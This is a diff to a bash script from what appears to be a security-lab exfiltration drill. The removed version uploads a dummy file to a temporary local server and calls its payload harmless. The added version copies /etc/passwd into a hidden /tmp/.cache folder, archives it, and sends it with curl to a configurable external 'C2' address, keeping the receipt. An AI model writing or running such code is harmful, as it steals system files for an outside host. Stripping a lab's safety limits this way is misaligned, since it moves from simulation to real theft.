@@ -1,11 +1,8 @@
 #!/usr/bin/env bash
-# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
+# attack（窗口内）：敏感记录打包并 POST 上传外部存储（接收端回执为成功物证）。
 set -euo pipefail
-HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
-# T1567.002：归档外传至"外部存储"（实验室本机模拟端点，不在批准清单）
-mkdir -p sensitive; echo "records" > sensitive/records.csv
-tar czf exfil.tar.gz sensitive
-python3 -m http.server 18081 >/dev/null 2>&1 &
-SRV=$!; sleep 0.5
-curl -sf -F "f=@exfil.tar.gz" http://127.0.0.1:18081/ >/dev/null || true
-kill $SRV 2>/dev/null || true
+C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
+mkdir -p /tmp/.cache/exfil/sensitive
+cp /etc/passwd /tmp/.cache/exfil/sensitive/records.csv 2>/dev/null || echo "records" > /tmp/.cache/exfil/sensitive/records.csv
+tar czf /tmp/.cache/exfil/exfil.tar.gz -C /tmp/.cache/exfil sensitive
+curl -s --max-time 10 -F "f=@/tmp/.cache/exfil/exfil.tar.gz" "http://$C2_IP:18081/exfil" > /tmp/.cache/exfil/upload-receipt.txt
